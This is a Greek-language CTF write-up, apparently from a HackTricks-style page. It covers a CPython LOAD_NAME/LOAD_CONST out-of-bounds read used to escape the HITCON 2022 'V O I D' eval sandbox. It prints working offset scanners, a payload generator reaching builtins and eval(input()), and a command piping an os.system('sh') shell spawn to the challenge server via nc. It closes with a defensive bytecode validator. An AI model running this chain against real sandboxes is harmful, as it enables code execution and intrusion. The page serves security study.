# LOAD_NAME / LOAD_CONST opcode OOB Read

Αυτή η σελίδα προσαρμόζει το αρχικό writeup και exploit chain του Splitline για το HITCON CTF 2022 "V O I D".<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Ένα operand των `LOAD_NAME` ή `LOAD_CONST` μπορεί να διαβάσει εκτός ενός σκόπιμα συντομευμένου tuple `co_names` ή `co_consts`. Σε αυτό το challenge, χρησιμοποιούνται μη προσβάσιμα dummy names μέχρι μια κοντινή καταχώριση να περιέχει ένα χρήσιμο attribute, όπως το `__getattribute__`.<sup>[[1]](#references)</sup>

Το υπόλοιπο payload επαναχρησιμοποιεί το όνομα που ανακτήθηκε για να δημιουργήσει ένα sandbox escape.<sup>[[1]](#references)</sup>

### Overview <a href="#overview-1" id="overview-1"></a>

Το wrapper του challenge είναι σύντομο και κάνει compile μία expression πριν την αξιολογήσει:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
Η είσοδος μεταγλωττίζεται σε ένα Python code object και, στη συνέχεια, το wrapper αντικαθιστά τα `co_consts` και `co_names` με κενά tuples πριν καλέσει το `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Οποιαδήποτε instruction που δημιουργείται και εξακολουθεί να κάνει index σε έναν από αυτούς τους πίνακες μπορεί να προκαλέσει crash στον interpreter ή να εκθέσει έναν pointer σε παρακείμενο object, ανάλογα με το build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Πώς συμβαίνει το segfault;

Για ένα list expression όπως το `[a, b, c]`, ο compiler δημιουργεί `LOAD_NAME` instructions με διαδοχικά operands:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Εάν το `co_names` αντικατασταθεί με `()`, το bytecode εξακολουθεί να περιέχει `LOAD_NAME 2`· επομένως, μια μη ελεγμένη πρόσβαση σε tuple μπορεί να ανακτήσει έναν pointer εκτός του tuple αντί να προκαλέσει `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

Τα `LOAD_NAME` και `LOAD_CONST` είναι οι βασικές primitives εδώ: οι ακέραιοι operands τους επιλέγουν καταχωρίσεις στα `co_names` και `co_consts`, αντίστοιχα.<sup>[[1]](#references)[[2]](#references)</sup>

Στο dispatch του CPython, το `LOAD_CONST` ανακτά την επιλεγμένη καταχώριση του tuple και την τοποθετεί στη στοίβα· τα release builds χρησιμοποιούν έναν μη ελεγμένο accessor tuple:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Δοκιμάστε αυξανόμενα operands του `LOAD_NAME` στον interpreter-στόχο, για να χαρτογραφήσετε χρήσιμες καταχωρίσεις. Το Splitline παρατήρησε χρήσιμα offsets πάνω από 700 στο περιβάλλον του challenge, αλλά η διάταξη εξαρτάται από το build· ένας debugger μπορεί να βοηθήσει στην επιθεώρηση της γύρω μνήμης.<sup>[[1]](#references)</sup>

### Δημιουργία του Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Μόλις ένα offset επιστρέψει ένα χρήσιμο όνομα, τοποθετήστε το lookup εκτός ορίων σε μια μη προσβάσιμη έκφραση και αναφέρετε το ίδιο slot του `co_names` από μια προσβάσιμη πρόσβαση attribute.<sup>[[1]](#references)</sup>

Για παράδειγμα, αν το offset 5 επιστρέφει `__getattribute__`, διατηρήστε αυτό το όνομα στο slot 5, ενώ το false branch εκτελεί το χρήσιμο lookup:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Το κείμενο που ανακτάται δεν χρειάζεται να είναι `__getattribute__`· οποιοδήποτε identifier που εξυπηρετεί το payload μπορεί να καταλάβει τη θέση.<sup>[[1]](#references)</sup>

Ο compiler επαναχρησιμοποιεί ένα slot του `co_names` για επαναλαμβανόμενες εμφανίσεις του ίδιου name, όπως δείχνει η αποσυναρμολόγηση:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Επειδή το `LOAD_ATTR` επιλύει επίσης το όνομά του μέσω του `co_names`, ο προσβάσιμος κλάδος μπορεί να επαναχρησιμοποιήσει αυτή τη θέση· τα packed operands σε νεότερες εκδόσεις του CPython περιγράφονται στις παρακάτω σημειώσεις έκδοσης.<sup>[[1]](#references)[[2]](#references)</sup>

Μικροί μη αρνητικοί ακέραιοι μπορούν να συντεθούν από boolean expressions χωρίς constants:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Το αρχικό exploit χρησιμοποιούσε names αντί για constants, ώστε να παραμείνει εντός του ορίου μήκους του challenge.<sup>[[1]](#references)</sup>

Αυτό το helper σαρώνει πιθανά name offsets κατασκευάζοντας ένα code object με ένα κενό tuple `co_names`.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Ο παρακάτω generator αντιστοιχίζει τα ανακτημένα offsets σε ονόματα και παράγει το payload σε επίπεδο source.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Σε υψηλό επίπεδο, το παραγόμενο payload αποκτά τα globals μιας συνάρτησης, ανακτά το `builtins` και καλεί το `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Σημειώσεις έκδοσης και επηρεαζόμενα opcodes (Python 3.11–3.13)

- Στα CPython 3.11–3.13, οι instructions εξακολουθούν να χρησιμοποιούν integer operands για την ευρετηρίαση των constant και name tables του code object. Αν οποιοδήποτε tuple είναι μικρότερο από έναν index που αναφέρεται, μια unchecked πρόσβαση μπορεί να διαβάσει έναν adjacent object pointer και να προκαλέσει crash ή να λειτουργήσει πάνω σε αυτόν· η ακριβής συμπεριφορά εξαρτάται από το interpreter build.<sup>[[2]](#references)[[3]](#references)</sup>
- Τα `LOAD_CONST consti` και (3.12+) `RETURN_CONST consti` διαβάζουν το `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Οι άμεσοι χρήστες του name table περιλαμβάνουν τα `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` και (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- Τα `LOAD_GLOBAL namei` και `LOAD_ATTR namei` χρησιμοποιούν το `co_names[namei >> 1]`· το low bit ελέγχει την τεκμηριωμένη συμπεριφορά NULL/method. (3.12+) Το `LOAD_SUPER_ATTR namei` χρησιμοποιεί το `co_names[namei >> 2]` και συσκευάζει δύο flags στα low bits του.<sup>[[2]](#references)</sup>
- Η Python 3.11+ εισήγαγε adaptive/inline caches που προσθέτουν κρυφές καταχωρίσεις `CACHE` μεταξύ των instructions. Το handcrafted bytecode πρέπει να λαμβάνει υπόψη αυτές τις καταχωρίσεις κατά τη δημιουργία του `co_code`.<sup>[[2]](#references)</sup>

Πρακτική συνέπεια: το bytecode layout και τα offsets που ανακτώνται εξαρτώνται από την έκδοση και το build. Δοκιμάστε την τεχνική και οποιοδήποτε generated payload έναντι της target έκδοσης του CPython πριν βασιστείτε σε αυτό.<sup>[[2]](#references)</sup>

### Γρήγορος scanner για χρήσιμα OOB indexes (συμβατός με 3.11+/3.12+)

Αν προτιμάτε να κάνετε probe για ενδιαφέροντα objects απευθείας από bytecode αντί από high-level source, μπορείτε να δημιουργήσετε minimal code objects και να κάνετε brute-force σε indexes. Ο παρακάτω helper εισάγει inline caches σύμφωνα με τα `dis` metadata του target interpreter.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Σημειώσεις
- Για να διερευνήσετε names αντί για constants, αντικαταστήστε το `LOAD_CONST` με `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` και προσαρμόστε τη χρήση του stack και το packed operand για το opcode-στόχο.<sup>[[2]](#references)</sup>
- Χρησιμοποιήστε `EXTENDED_ARG` ή πολλαπλά bytes του `arg` για να φτάσετε σε indexes >255, αν χρειάζεται. Αυτό το helper εκπέμπει μόνο το low operand byte, επομένως τα μεγαλύτερα indexes απαιτούν raw byte construction ή multiple loads.<sup>[[2]](#references)</sup>

### Ελάχιστο bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

Μόλις εντοπίσετε ένα `co_consts` index που επιλύεται στο builtins module, μπορείτε να ανακατασκευάσετε το `eval(input())` χωρίς `co_names`, χειραγωγώντας το stack. Το υλικό του επίσημου B01lers CTF 2024 `awpcode` τεκμηριώνει το ίδιο OOB-read pattern.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Αυτή η προσέγγιση που βασίζεται αποκλειστικά στο stack είναι χρήσιμη όταν ένα challenge σάς παρέχει άμεσο έλεγχο του `co_code`, ενώ επιβάλλει `co_consts=()` και `co_names=()`· αποφεύγει tricks σε επίπεδο source και μπορεί να διατηρεί τα payloads μικρά, χρησιμοποιώντας bytecode stack operations και tuple builders.<sup>[[4]](#references)</sup>

### Αμυντικοί έλεγχοι και mitigations για sandboxes

Αν γράφετε ένα Python sandbox που κάνει compile ή evaluate μη αξιόπιστο code, μην βασίζεστε στο CPython για bounds-checking των tuple indexes που χρησιμοποιούνται από το bytecode. Επικυρώνετε τα code objects πριν από την εκτέλεσή τους.<sup>[[2]](#references)[[3]](#references)</sup>

Πρακτικός validator (απορρίπτει OOB access στα co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Πρόσθετες ιδέες μετριασμού
- Μην επιτρέπετε αυθαίρετη χρήση του `CodeType.replace(...)` σε μη αξιόπιστη είσοδο ή προσθέστε αυστηρούς δομικούς ελέγχους στο resulting code object.
- Εξετάστε το ενδεχόμενο εκτέλεσης μη αξιόπιστου κώδικα σε ξεχωριστή διεργασία με sandboxing σε επίπεδο λειτουργικού συστήματος (seccomp, job objects, containers), αντί να βασίζεστε στη σημασιολογία του CPython.

## References

- [1] [Το writeup του Splitline για το HITCON CTF 2022 "V O I D" (η προέλευση αυτής της τεχνικής και η exploit chain υψηλού επιπέδου)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Τεκμηρίωση του `dis` στην Python 3.13 (indices των bytecode, packed name operands και inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [Μακροεντολές πρόσβασης σε tuple του CPython 3.13.5 (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [Writeup της πρόκλησης `awpcode` στο B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Αντικείμενα κώδικα](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
